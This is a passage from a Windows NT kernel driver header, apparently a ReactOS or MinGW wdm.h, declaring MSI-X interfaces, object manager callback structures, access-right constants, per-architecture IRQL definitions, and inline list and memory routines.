  IN PVOID Context,
  IN ULONG TableEntry);
typedef PCI_MSIX_MASKUNMASK_ENTRY *PPCI_MSIX_MASKUNMASK_ENTRY;

typedef NTSTATUS
(NTAPI PCI_MSIX_GET_ENTRY)(
  IN PVOID Context,
  IN ULONG TableEntry,
  OUT PULONG MessageNumber,
  OUT PBOOLEAN Masked);
typedef PCI_MSIX_GET_ENTRY *PPCI_MSIX_GET_ENTRY;

typedef NTSTATUS
(NTAPI PCI_MSIX_GET_TABLE_SIZE)(
  IN PVOID Context,
  OUT PULONG TableSize);
typedef PCI_MSIX_GET_TABLE_SIZE *PPCI_MSIX_GET_TABLE_SIZE;

typedef struct _PCI_MSIX_TABLE_CONFIG_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PPCI_MSIX_SET_ENTRY SetTableEntry;
  PPCI_MSIX_MASKUNMASK_ENTRY MaskTableEntry;
  PPCI_MSIX_MASKUNMASK_ENTRY UnmaskTableEntry;
  PPCI_MSIX_GET_ENTRY GetTableEntry;
  PPCI_MSIX_GET_TABLE_SIZE GetTableSize;
} PCI_MSIX_TABLE_CONFIG_INTERFACE, *PPCI_MSIX_TABLE_CONFIG_INTERFACE;

#define PCI_MSIX_TABLE_CONFIG_MINIMUM_SIZE \
        RTL_SIZEOF_THROUGH_FIELD(PCI_MSIX_TABLE_CONFIG_INTERFACE, UnmaskTableEntry)

/******************************************************************************
 *                            Object Manager Types                            *
 ******************************************************************************/

#define MAXIMUM_FILENAME_LENGTH           256
#define OBJ_NAME_PATH_SEPARATOR           ((WCHAR)L'\\')

#define OBJECT_TYPE_CREATE                0x0001
#define OBJECT_TYPE_ALL_ACCESS            (STANDARD_RIGHTS_REQUIRED | 0x1)

#define DIRECTORY_QUERY                   0x0001
#define DIRECTORY_TRAVERSE                0x0002
#define DIRECTORY_CREATE_OBJECT           0x0004
#define DIRECTORY_CREATE_SUBDIRECTORY     0x0008
#define DIRECTORY_ALL_ACCESS              (STANDARD_RIGHTS_REQUIRED | 0xF)

#define SYMBOLIC_LINK_QUERY               0x0001
#define SYMBOLIC_LINK_ALL_ACCESS          (STANDARD_RIGHTS_REQUIRED | 0x1)

#define DUPLICATE_CLOSE_SOURCE            0x00000001
#define DUPLICATE_SAME_ACCESS             0x00000002
#define DUPLICATE_SAME_ATTRIBUTES         0x00000004

#define OB_FLT_REGISTRATION_VERSION_0100  0x0100
#define OB_FLT_REGISTRATION_VERSION       OB_FLT_REGISTRATION_VERSION_0100

typedef ULONG OB_OPERATION;

#define OB_OPERATION_HANDLE_CREATE        0x00000001
#define OB_OPERATION_HANDLE_DUPLICATE     0x00000002

typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {
  IN OUT ACCESS_MASK DesiredAccess;
  IN ACCESS_MASK OriginalDesiredAccess;
} OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;

typedef struct _OB_PRE_DUPLICATE_HANDLE_INFORMATION {
  IN OUT ACCESS_MASK DesiredAccess;
  IN ACCESS_MASK OriginalDesiredAccess;
  IN PVOID SourceProcess;
  IN PVOID TargetProcess;
} OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;

typedef union _OB_PRE_OPERATION_PARAMETERS {
  IN OUT OB_PRE_CREATE_HANDLE_INFORMATION CreateHandleInformation;
  IN OUT OB_PRE_DUPLICATE_HANDLE_INFORMATION DuplicateHandleInformation;
} OB_PRE_OPERATION_PARAMETERS, *POB_PRE_OPERATION_PARAMETERS;

typedef struct _OB_PRE_OPERATION_INFORMATION {
  IN OB_OPERATION Operation;
  _ANONYMOUS_UNION union {
    IN ULONG Flags;
    _ANONYMOUS_STRUCT struct {
      IN ULONG KernelHandle:1;
      IN ULONG Reserved:31;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  IN PVOID Object;
  IN POBJECT_TYPE ObjectType;
  OUT PVOID CallContext;
  IN POB_PRE_OPERATION_PARAMETERS Parameters;
} OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;

typedef struct _OB_POST_CREATE_HANDLE_INFORMATION {
  IN ACCESS_MASK GrantedAccess;
} OB_POST_CREATE_HANDLE_INFORMATION, *POB_POST_CREATE_HANDLE_INFORMATION;

typedef struct _OB_POST_DUPLICATE_HANDLE_INFORMATION {
  IN ACCESS_MASK GrantedAccess;
} OB_POST_DUPLICATE_HANDLE_INFORMATION, *POB_POST_DUPLICATE_HANDLE_INFORMATION;

typedef union _OB_POST_OPERATION_PARAMETERS {
  IN OB_POST_CREATE_HANDLE_INFORMATION CreateHandleInformation;
  IN OB_POST_DUPLICATE_HANDLE_INFORMATION DuplicateHandleInformation;
} OB_POST_OPERATION_PARAMETERS, *POB_POST_OPERATION_PARAMETERS;

typedef struct _OB_POST_OPERATION_INFORMATION {
  IN OB_OPERATION Operation;
  _ANONYMOUS_UNION union {
    IN ULONG Flags;
    _ANONYMOUS_STRUCT struct {
      IN ULONG KernelHandle:1;
      IN ULONG Reserved:31;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  IN PVOID Object;
  IN POBJECT_TYPE ObjectType;
  IN PVOID CallContext;
  IN NTSTATUS ReturnStatus;
  IN POB_POST_OPERATION_PARAMETERS Parameters;
} OB_POST_OPERATION_INFORMATION,*POB_POST_OPERATION_INFORMATION;

typedef enum _OB_PREOP_CALLBACK_STATUS {
  OB_PREOP_SUCCESS
} OB_PREOP_CALLBACK_STATUS, *POB_PREOP_CALLBACK_STATUS;

typedef OB_PREOP_CALLBACK_STATUS
(NTAPI *POB_PRE_OPERATION_CALLBACK)(
  IN PVOID RegistrationContext,
  IN OUT POB_PRE_OPERATION_INFORMATION OperationInformation);

typedef VOID
(NTAPI *POB_POST_OPERATION_CALLBACK)(
  IN PVOID RegistrationContext,
  IN POB_POST_OPERATION_INFORMATION OperationInformation);

typedef struct _OB_OPERATION_REGISTRATION {
  IN POBJECT_TYPE *ObjectType;
  IN OB_OPERATION Operations;
  IN POB_PRE_OPERATION_CALLBACK PreOperation;
  IN POB_POST_OPERATION_CALLBACK PostOperation;
} OB_OPERATION_REGISTRATION, *POB_OPERATION_REGISTRATION;

typedef struct _OB_CALLBACK_REGISTRATION {
  IN USHORT Version;
  IN USHORT OperationRegistrationCount;
  IN UNICODE_STRING Altitude;
  IN PVOID RegistrationContext;
  IN OB_OPERATION_REGISTRATION *OperationRegistration;
} OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;

typedef struct _OBJECT_NAME_INFORMATION {
  UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

/* Exported object types */
extern POBJECT_TYPE NTSYSAPI *CmKeyObjectType;
extern POBJECT_TYPE NTSYSAPI *ExEventObjectType;
extern POBJECT_TYPE NTSYSAPI *ExSemaphoreObjectType;
extern POBJECT_TYPE NTSYSAPI *IoFileObjectType;
extern POBJECT_TYPE NTSYSAPI *PsThreadType;
extern POBJECT_TYPE NTSYSAPI *SeTokenObjectType;
extern POBJECT_TYPE NTSYSAPI *PsProcessType;
extern POBJECT_TYPE NTSYSAPI *TmEnlistmentObjectType;
extern POBJECT_TYPE NTSYSAPI *TmResourceManagerObjectType;
extern POBJECT_TYPE NTSYSAPI *TmTransactionManagerObjectType;
extern POBJECT_TYPE NTSYSAPI *TmTransactionObjectType;

/******************************************************************************
 *                           Process Manager Types                            *
 ******************************************************************************/

#define QUOTA_LIMITS_HARDWS_MIN_ENABLE  0x00000001
#define QUOTA_LIMITS_HARDWS_MIN_DISABLE 0x00000002
#define QUOTA_LIMITS_HARDWS_MAX_ENABLE  0x00000004
#define QUOTA_LIMITS_HARDWS_MAX_DISABLE 0x00000008
#define QUOTA_LIMITS_USE_DEFAULT_LIMITS 0x00000010

/* Thread Access Rights */
#define THREAD_TERMINATE                 0x0001
#define THREAD_SUSPEND_RESUME            0x0002
#define THREAD_ALERT                     0x0004
#define THREAD_GET_CONTEXT               0x0008
#define THREAD_SET_CONTEXT               0x0010
#define THREAD_SET_INFORMATION           0x0020
#define THREAD_SET_LIMITED_INFORMATION   0x0400
#define THREAD_QUERY_LIMITED_INFORMATION 0x0800

#define PROCESS_DUP_HANDLE               (0x0040)

#if (NTDDI_VERSION >= NTDDI_VISTA)
#define PROCESS_ALL_ACCESS  (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)
#else
#define PROCESS_ALL_ACCESS  (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFF)
#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)
#define THREAD_ALL_ACCESS   (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)
#else
#define THREAD_ALL_ACCESS   (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3FF)
#endif

#define LOW_PRIORITY                      0
#define LOW_REALTIME_PRIORITY             16
#define HIGH_PRIORITY                     31
#define MAXIMUM_PRIORITY                  32


/******************************************************************************
 *                          WMI Library Support Types                         *
 ******************************************************************************/

#ifdef RUN_WPP
#include <evntrace.h>
#include <stdarg.h>
#endif

#ifndef _TRACEHANDLE_DEFINED
#define _TRACEHANDLE_DEFINED
typedef ULONG64 TRACEHANDLE, *PTRACEHANDLE;
#endif

#ifndef TRACE_INFORMATION_CLASS_DEFINE

typedef struct _ETW_TRACE_SESSION_SETTINGS {
  ULONG Version;
  ULONG BufferSize;
  ULONG MinimumBuffers;
  ULONG MaximumBuffers;
  ULONG LoggerMode;
  ULONG FlushTimer;
  ULONG FlushThreshold;
  ULONG ClockType;
} ETW_TRACE_SESSION_SETTINGS, *PETW_TRACE_SESSION_SETTINGS;

typedef enum _TRACE_INFORMATION_CLASS {
  TraceIdClass,
  TraceHandleClass,
  TraceEnableFlagsClass,
  TraceEnableLevelClass,
  GlobalLoggerHandleClass,
  EventLoggerHandleClass,
  AllLoggerHandlesClass,
  TraceHandleByNameClass,
  LoggerEventsLostClass,
  TraceSessionSettingsClass,
  LoggerEventsLoggedClass,
  DiskIoNotifyRoutinesClass,
  TraceInformationClassReserved1,
  FltIoNotifyRoutinesClass,
  TraceInformationClassReserved2,
  WdfNotifyRoutinesClass,
  MaxTraceInformationClass
} TRACE_INFORMATION_CLASS;

#endif /* TRACE_INFORMATION_CLASS_DEFINE */

#ifndef _ETW_KM_
#define _ETW_KM_
#endif

#include <evntprov.h>

typedef VOID
(NTAPI *PETWENABLECALLBACK)(
  IN LPCGUID SourceId,
  IN ULONG ControlCode,
  IN UCHAR Level,
  IN ULONGLONG MatchAnyKeyword,
  IN ULONGLONG MatchAllKeyword,
  IN PEVENT_FILTER_DESCRIPTOR FilterData OPTIONAL,
  IN OUT PVOID CallbackContext OPTIONAL);

#define EVENT_WRITE_FLAG_NO_FAULTING             0x00000001


#if defined(_M_IX86)
/** Kernel definitions for x86 **/

/* Interrupt request levels */
#define PASSIVE_LEVEL           0
#define LOW_LEVEL               0
#define APC_LEVEL               1
#define DISPATCH_LEVEL          2
#define CMCI_LEVEL              5
#define PROFILE_LEVEL           27
#define CLOCK1_LEVEL            28
#define CLOCK2_LEVEL            28
#define IPI_LEVEL               29
#define POWER_LEVEL             30
#define HIGH_LEVEL              31
#define CLOCK_LEVEL             CLOCK2_LEVEL

#define KIP0PCRADDRESS          0xffdff000
#define KI_USER_SHARED_DATA     0xffdf0000
#define SharedUserData          ((KUSER_SHARED_DATA * CONST)KI_USER_SHARED_DATA)

#define PAGE_SIZE               0x1000
#define PAGE_SHIFT              12L
#define KeGetDcacheFillSize()   1L

#define EFLAG_SIGN              0x8000
#define EFLAG_ZERO              0x4000
#define EFLAG_SELECT            (EFLAG_SIGN | EFLAG_ZERO)

#define RESULT_NEGATIVE         ((EFLAG_SIGN & ~EFLAG_ZERO) & EFLAG_SELECT)
#define RESULT_ZERO             ((~EFLAG_SIGN & EFLAG_ZERO) & EFLAG_SELECT)
#define RESULT_POSITIVE         ((~EFLAG_SIGN & ~EFLAG_ZERO) & EFLAG_SELECT)


typedef struct _KFLOATING_SAVE {
  ULONG ControlWord;
  ULONG StatusWord;
  ULONG ErrorOffset;
  ULONG ErrorSelector;
  ULONG DataOffset;
  ULONG DataSelector;
  ULONG Cr0NpxState;
  ULONG Spare1;
} KFLOATING_SAVE, *PKFLOATING_SAVE;

extern NTKERNELAPI volatile KSYSTEM_TIME KeTickCount;

#define YieldProcessor _mm_pause

FORCEINLINE
VOID
KeMemoryBarrier(VOID)
{
  volatile LONG Barrier;
#if defined(__GNUC__)
  __asm__ __volatile__ ("xchg %%eax, %0" : : "m" (Barrier) : "%eax");
#elif defined(_MSC_VER)
  __asm xchg [Barrier], eax
#endif
}

NTHALAPI
KIRQL
NTAPI
KeGetCurrentIrql(VOID);

NTHALAPI
VOID
FASTCALL
KfLowerIrql(
  IN KIRQL NewIrql);
#define KeLowerIrql(a) KfLowerIrql(a)

NTHALAPI
KIRQL
FASTCALL
KfRaiseIrql(
  IN KIRQL NewIrql);
#define KeRaiseIrql(a,b) *(b) = KfRaiseIrql(a)

NTHALAPI
KIRQL
NTAPI
KeRaiseIrqlToDpcLevel(VOID);

NTHALAPI
KIRQL
NTAPI
KeRaiseIrqlToSynchLevel(VOID);

NTHALAPI
KIRQL
FASTCALL
KfAcquireSpinLock(
  IN OUT PKSPIN_LOCK SpinLock);
#define KeAcquireSpinLock(a,b) *(b) = KfAcquireSpinLock(a)

NTHALAPI
VOID
FASTCALL
KfReleaseSpinLock(
  IN OUT PKSPIN_LOCK SpinLock,
  IN KIRQL NewIrql);
#define KeReleaseSpinLock(a,b) KfReleaseSpinLock(a,b)

NTKERNELAPI
VOID
FASTCALL
KefAcquireSpinLockAtDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock);
#define KeAcquireSpinLockAtDpcLevel(SpinLock) KefAcquireSpinLockAtDpcLevel(SpinLock)

NTKERNELAPI
VOID
FASTCALL
KefReleaseSpinLockFromDpcLevel(
  IN OUT PKSPIN_LOCK SpinLock);
#define KeReleaseSpinLockFromDpcLevel(SpinLock) KefReleaseSpinLockFromDpcLevel(SpinLock)

NTSYSAPI
PKTHREAD
NTAPI
KeGetCurrentThread(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
KeSaveFloatingPointState(
  OUT PKFLOATING_SAVE FloatSave);

NTKERNELAPI
NTSTATUS
NTAPI
KeRestoreFloatingPointState(
  IN PKFLOATING_SAVE FloatSave);

/* VOID
 * KeFlushIoBuffers(
 *   IN PMDL Mdl,
 *   IN BOOLEAN ReadOperation,
 *   IN BOOLEAN DmaOperation)
 */
#define KeFlushIoBuffers(_Mdl, _ReadOperation, _DmaOperation)

/* x86 and x64 performs a 0x2C interrupt */
#define DbgRaiseAssertionFailure __int2c

FORCEINLINE
VOID
_KeQueryTickCount(
  OUT PLARGE_INTEGER CurrentCount)
{
  for (;;) {
#ifdef NONAMELESSUNION
    CurrentCount->s.HighPart = KeTickCount.High1Time;
    CurrentCount->s.LowPart = KeTickCount.LowPart;
    if (CurrentCount->s.HighPart == KeTickCount.High2Time) break;
#else
    CurrentCount->HighPart = KeTickCount.High1Time;
    CurrentCount->LowPart = KeTickCount.LowPart;
    if (CurrentCount->HighPart == KeTickCount.High2Time) break;
#endif
    YieldProcessor();
  }
}
#define KeQueryTickCount(CurrentCount) _KeQueryTickCount(CurrentCount)


#elif defined(_M_AMD64)
/** Kernel definitions for AMD64 **/

/* Interrupt request levels */
#define PASSIVE_LEVEL           0
#define LOW_LEVEL               0
#define APC_LEVEL               1
#define DISPATCH_LEVEL          2
#define CMCI_LEVEL              5
#define CLOCK_LEVEL             13
#define IPI_LEVEL               14
#define DRS_LEVEL               14
#define POWER_LEVEL             14
#define PROFILE_LEVEL           15
#define HIGH_LEVEL              15

#define KI_USER_SHARED_DATA     0xFFFFF78000000000ULL
#define SharedUserData          ((PKUSER_SHARED_DATA const)KI_USER_SHARED_DATA)
#define SharedInterruptTime     (KI_USER_SHARED_DATA + 0x8)
#define SharedSystemTime        (KI_USER_SHARED_DATA + 0x14)
#define SharedTickCount         (KI_USER_SHARED_DATA + 0x320)

#define PAGE_SIZE               0x1000
#define PAGE_SHIFT              12L

#define EFLAG_SIGN              0x8000
#define EFLAG_ZERO              0x4000
#define EFLAG_SELECT            (EFLAG_SIGN | EFLAG_ZERO)

typedef struct _KFLOATING_SAVE {
  ULONG Dummy;
} KFLOATING_SAVE, *PKFLOATING_SAVE;

typedef XSAVE_FORMAT XMM_SAVE_AREA32, *PXMM_SAVE_AREA32;

#define KeQueryInterruptTime() \
    (*(volatile ULONG64*)SharedInterruptTime)

#define KeQuerySystemTime(CurrentCount) \
    *(ULONG64*)(CurrentCount) = *(volatile ULONG64*)SharedSystemTime

#define KeQueryTickCount(CurrentCount) \
    *(ULONG64*)(CurrentCount) = *(volatile ULONG64*)SharedTickCount

#define KeGetDcacheFillSize() 1L

#define YieldProcessor _mm_pause

FORCEINLINE
KIRQL
KeGetCurrentIrql(VOID)
{
  return (KIRQL)__readcr8();
}

FORCEINLINE
VOID
KeLowerIrql(IN KIRQL NewIrql)
{
  //ASSERT(KeGetCurrentIrql() >= NewIrql);
  __writecr8(NewIrql);
}

FORCEINLINE
KIRQL
KfRaiseIrql(IN KIRQL NewIrql)
{
  KIRQL OldIrql;

  OldIrql = (KIRQL)__readcr8();
  //ASSERT(OldIrql <= NewIrql);
  __writecr8(NewIrql);
  return OldIrql;
}
#define KeRaiseIrql(a,b) *(b) = KfRaiseIrql(a)

FORCEINLINE
KIRQL
KeRaiseIrqlToDpcLevel(VOID)
{
  return KfRaiseIrql(DISPATCH_LEVEL);
}

FORCEINLINE
KIRQL
KeRaiseIrqlToSynchLevel(VOID)
{
  return KfRaiseIrql(12); // SYNCH_LEVEL = IPI_LEVEL - 2
}

FORCEINLINE
PKTHREAD
KeGetCurrentThread(VOID)
{
  return (struct _KTHREAD *)__readgsqword(0x188);
}

/* VOID
 * KeFlushIoBuffers(
 *   IN PMDL Mdl,
 *   IN BOOLEAN ReadOperation,
 *   IN BOOLEAN DmaOperation)
 */
#define KeFlushIoBuffers(_Mdl, _ReadOperation, _DmaOperation)

/* x86 and x64 performs a 0x2C interrupt */
#define DbgRaiseAssertionFailure __int2c

#elif defined(_M_IA64)
/** Kernel definitions for IA64 **/

/* Interrupt request levels */
#define PASSIVE_LEVEL           0
#define LOW_LEVEL               0
#define APC_LEVEL               1
#define DISPATCH_LEVEL          2
#define CMC_LEVEL               3
#define DEVICE_LEVEL_BASE       4
#define PC_LEVEL                12
#define IPI_LEVEL               14
#define DRS_LEVEL               14
#define CLOCK_LEVEL             13
#define POWER_LEVEL             15
#define PROFILE_LEVEL           15
#define HIGH_LEVEL              15

#define KI_USER_SHARED_DATA ((ULONG_PTR)(KADDRESS_BASE + 0xFFFE0000))
extern volatile LARGE_INTEGER KeTickCount;

#define PAUSE_PROCESSOR __yield();

FORCEINLINE
VOID
KeFlushWriteBuffer(VOID)
{
  __mf ();
  return;
}

NTSYSAPI
PKTHREAD
NTAPI
KeGetCurrentThread(VOID);


#elif defined(_M_PPC)

/* Interrupt request levels */
#define PASSIVE_LEVEL                      0
#define LOW_LEVEL                          0
#define APC_LEVEL                          1
#define DISPATCH_LEVEL                     2
#define PROFILE_LEVEL                     27
#define CLOCK1_LEVEL                      28
#define CLOCK2_LEVEL                      28
#define IPI_LEVEL                         29
#define POWER_LEVEL                       30
#define HIGH_LEVEL                        31

//
// Used to contain PFNs and PFN counts
//
typedef ULONG PFN_COUNT;
typedef ULONG PFN_NUMBER, *PPFN_NUMBER;
typedef LONG SPFN_NUMBER, *PSPFN_NUMBER;


typedef struct _KFLOATING_SAVE {
  ULONG Dummy;
} KFLOATING_SAVE, *PKFLOATING_SAVE;

typedef struct _KPCR_TIB {
  PVOID ExceptionList;         /* 00 */
  PVOID StackBase;             /* 04 */
  PVOID StackLimit;            /* 08 */
  PVOID SubSystemTib;          /* 0C */
  _ANONYMOUS_UNION union {
    PVOID FiberData;           /* 10 */
    ULONG Version;             /* 10 */
  } DUMMYUNIONNAME;
  PVOID ArbitraryUserPointer;  /* 14 */
  struct _KPCR_TIB *Self;       /* 18 */
} KPCR_TIB, *PKPCR_TIB;         /* 1C */

#define PCR_MINOR_VERSION 1
#define PCR_MAJOR_VERSION 1

typedef struct _KPCR {
  KPCR_TIB Tib;                /* 00 */
  struct _KPCR *Self;          /* 1C */
  struct _KPRCB *Prcb;         /* 20 */
  KIRQL Irql;                  /* 24 */
  ULONG IRR;                   /* 28 */
  ULONG IrrActive;             /* 2C */
  ULONG IDR;                   /* 30 */
  PVOID KdVersionBlock;        /* 34 */
  PUSHORT IDT;                 /* 38 */
  PUSHORT GDT;                 /* 3C */
  struct _KTSS *TSS;           /* 40 */
  USHORT MajorVersion;         /* 44 */
  USHORT MinorVersion;         /* 46 */
  KAFFINITY SetMember;         /* 48 */
  ULONG StallScaleFactor;      /* 4C */
  UCHAR SpareUnused;           /* 50 */
  UCHAR Number;                /* 51 */
} KPCR, *PKPCR;                /* 54 */

#define KeGetPcr()                      PCR

#define YieldProcessor() __asm__ __volatile__("nop");

FORCEINLINE
ULONG
NTAPI
KeGetCurrentProcessorNumber(VOID)
{
  ULONG Number;
  __asm__ __volatile__ (
    "lwz %0, %c1(12)\n"
    : "=r" (Number)
    : "i" (FIELD_OFFSET(KPCR, Number))
  );
  return Number;
}

NTHALAPI
VOID
FASTCALL
KfLowerIrql(
  IN KIRQL NewIrql);
#define KeLowerIrql(a) KfLowerIrql(a)

NTHALAPI
KIRQL
FASTCALL
KfRaiseIrql(
  IN KIRQL NewIrql);
#define KeRaiseIrql(a,b) *(b) = KfRaiseIrql(a)

NTHALAPI
KIRQL
NTAPI
KeRaiseIrqlToDpcLevel(VOID);

NTHALAPI
KIRQL
NTAPI
KeRaiseIrqlToSynchLevel(VOID);



#elif defined(_M_MIPS)
#error MIPS Headers are totally incorrect

//
// Used to contain PFNs and PFN counts
//
typedef ULONG PFN_COUNT;
typedef ULONG PFN_NUMBER, *PPFN_NUMBER;
typedef LONG SPFN_NUMBER, *PSPFN_NUMBER;

#define PASSIVE_LEVEL                      0
#define APC_LEVEL                          1
#define DISPATCH_LEVEL                     2
#define PROFILE_LEVEL                     27
#define IPI_LEVEL                         29
#define HIGH_LEVEL                        31

typedef struct _KPCR {
  struct _KPRCB *Prcb;         /* 20 */
  KIRQL Irql;                  /* 24 */
  ULONG IRR;                   /* 28 */
  ULONG IDR;                   /* 30 */
} KPCR, *PKPCR;

#define KeGetPcr()                      PCR

typedef struct _KFLOATING_SAVE {
} KFLOATING_SAVE, *PKFLOATING_SAVE;

static __inline
ULONG
NTAPI
KeGetCurrentProcessorNumber(VOID)
{
  return 0;
}

#define YieldProcessor() __asm__ __volatile__("nop");

#define KeLowerIrql(a) KfLowerIrql(a)
#define KeRaiseIrql(a,b) *(b) = KfRaiseIrql(a)

NTKERNELAPI
VOID
NTAPI
KfLowerIrql(
  IN KIRQL NewIrql);

NTKERNELAPI
KIRQL
NTAPI
KfRaiseIrql(
  IN KIRQL NewIrql);

NTKERNELAPI
KIRQL
NTAPI
KeRaiseIrqlToDpcLevel(VOID);

NTKERNELAPI
KIRQL
NTAPI
KeRaiseIrqlToSynchLevel(VOID);


#elif defined(_M_ARM)
#include <armddk.h>
#else
#error Unknown Architecture
#endif


/******************************************************************************
 *                         Runtime Library Functions                          *
 ******************************************************************************/

#if !defined(MIDL_PASS) && !defined(SORTPP_PASS)

#define RTL_STATIC_LIST_HEAD(x) LIST_ENTRY x = { &x, &x }

FORCEINLINE
VOID
InitializeListHead(
  OUT PLIST_ENTRY ListHead)
{
  ListHead->Flink = ListHead->Blink = ListHead;
}

FORCEINLINE
BOOLEAN
IsListEmpty(
  IN CONST LIST_ENTRY * ListHead)
{
  return (BOOLEAN)(ListHead->Flink == ListHead);
}

FORCEINLINE
BOOLEAN
RemoveEntryList(
  IN PLIST_ENTRY Entry)
{
  PLIST_ENTRY OldFlink;
  PLIST_ENTRY OldBlink;

  OldFlink = Entry->Flink;
  OldBlink = Entry->Blink;
  OldFlink->Blink = OldBlink;
  OldBlink->Flink = OldFlink;
  return (BOOLEAN)(OldFlink == OldBlink);
}

FORCEINLINE
PLIST_ENTRY
RemoveHeadList(
  IN OUT PLIST_ENTRY ListHead)
{
  PLIST_ENTRY Flink;
  PLIST_ENTRY Entry;

  Entry = ListHead->Flink;
  Flink = Entry->Flink;
  ListHead->Flink = Flink;
  Flink->Blink = ListHead;
  return Entry;
}

FORCEINLINE
PLIST_ENTRY
RemoveTailList(
  IN OUT PLIST_ENTRY ListHead)
{
  PLIST_ENTRY Blink;
  PLIST_ENTRY Entry;

  Entry = ListHead->Blink;
  Blink = Entry->Blink;
  ListHead->Blink = Blink;
  Blink->Flink = ListHead;
  return Entry;
}

FORCEINLINE
VOID
InsertTailList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PLIST_ENTRY Entry)
{
  PLIST_ENTRY OldBlink;
  OldBlink = ListHead->Blink;
  Entry->Flink = ListHead;
  Entry->Blink = OldBlink;
  OldBlink->Flink = Entry;
  ListHead->Blink = Entry;
}

FORCEINLINE
VOID
InsertHeadList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PLIST_ENTRY Entry)
{
  PLIST_ENTRY OldFlink;
  OldFlink = ListHead->Flink;
  Entry->Flink = OldFlink;
  Entry->Blink = ListHead;
  OldFlink->Blink = Entry;
  ListHead->Flink = Entry;
}

FORCEINLINE
VOID
AppendTailList(
  IN OUT PLIST_ENTRY ListHead,
  IN OUT PLIST_ENTRY ListToAppend)
{
  PLIST_ENTRY ListEnd = ListHead->Blink;

  ListHead->Blink->Flink = ListToAppend;
  ListHead->Blink = ListToAppend->Blink;
  ListToAppend->Blink->Flink = ListHead;
  ListToAppend->Blink = ListEnd;
}

FORCEINLINE
PSINGLE_LIST_ENTRY
PopEntryList(
  IN OUT PSINGLE_LIST_ENTRY ListHead)
{
  PSINGLE_LIST_ENTRY FirstEntry;
  FirstEntry = ListHead->Next;
  if (FirstEntry != NULL) {
    ListHead->Next = FirstEntry->Next;
  }
  return FirstEntry;
}

FORCEINLINE
VOID
PushEntryList(
  IN OUT PSINGLE_LIST_ENTRY ListHead,
  IN OUT PSINGLE_LIST_ENTRY Entry)
{
  Entry->Next = ListHead->Next;
  ListHead->Next = Entry;
}

#endif /* !defined(MIDL_PASS) && !defined(SORTPP_PASS) */

NTSYSAPI
VOID
NTAPI
RtlAssert(
  IN PVOID FailedAssertion,
  IN PVOID FileName,
  IN ULONG LineNumber,
  IN PSTR Message);

/* VOID
 * RtlCopyMemory(
 *     IN VOID UNALIGNED *Destination,
 *     IN CONST VOID UNALIGNED *Source,
 *     IN SIZE_T Length)
 */
#define RtlCopyMemory(Destination, Source, Length) \
    memcpy(Destination, Source, Length)

#define RtlCopyBytes RtlCopyMemory

#if defined(_M_AMD64)
NTSYSAPI
VOID
NTAPI
RtlCopyMemoryNonTemporal(
  VOID UNALIGNED *Destination,
  CONST VOID UNALIGNED *Source,
  SIZE_T Length);
#else
#define RtlCopyMemoryNonTemporal RtlCopyMemory
#endif

/* BOOLEAN
 * RtlEqualLuid(
 *     IN PLUID Luid1,
 *     IN PLUID Luid2)
 */
#define RtlEqualLuid(Luid1, Luid2) \
    (((Luid1)->LowPart == (Luid2)->LowPart) && ((Luid1)->HighPart == (Luid2)->HighPart))

/* ULONG
 * RtlEqualMemory(
 *     IN VOID UNALIGNED *Destination,
 *     IN CONST VOID UNALIGNED *Source,
 *     IN SIZE_T Length)
 */
#define RtlEqualMemory(Destination, Source, Length) \
    (!memcmp(Destination, Source, Length))

/* VOID
 * RtlFillMemory(
 *     IN VOID UNALIGNED *Destination,
 *     IN SIZE_T Length,
 *     IN UCHAR Fill)
 */
#define RtlFillMemory(Destination, Length, Fill) \
    memset(Destination, Fill, Length)

#define RtlFillBytes RtlFillMemory

NTSYSAPI
VOID
NTAPI
RtlFreeUnicodeString(
  IN OUT PUNICODE_STRING UnicodeString);

NTSYSAPI
NTSTATUS
NTAPI
RtlGUIDFromString(
  IN PUNICODE_STRING GuidString,
  OUT GUID *Guid);

NTSYSAPI
VOID
NTAPI
RtlInitUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PCWSTR SourceString OPTIONAL);

/* VOID
 * RtlMoveMemory(
 *    IN VOID UNALIGNED *Destination,
 *    IN CONST VOID UNALIGNED *Source,
 *    IN SIZE_T Length)
 */
#define RtlMoveMemory(Destination, Source, Length) \
    memmove(Destination, Source, Length)

NTSYSAPI
NTSTATUS
NTAPI
RtlStringFromGUID(
  IN REFGUID Guid,
  OUT PUNICODE_STRING GuidString);

/* VOID
 * RtlZeroMemory(
 *     IN VOID UNALIGNED *Destination,
 *     IN SIZE_T Length)
 */
#define RtlZeroMemory(Destination, Length) \
    memset(Destination, 0, Length)

#define RtlZeroBytes RtlZeroMemory

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTSYSAPI
BOOLEAN
NTAPI
RtlAreBitsClear(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG StartingIndex,
  IN ULONG Length);

NTSYSAPI
BOOLEAN
NTAPI
RtlAreBitsSet(
  IN PRTL_BITMAP BitMapHeader,
  IN ULONG StartingIndex,
  IN ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
RtlAnsiStringToUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PANSI_STRING SourceString,
  IN BOOLEAN AllocateDestinationString);

NTSYSAPI
ULONG
NTAPI
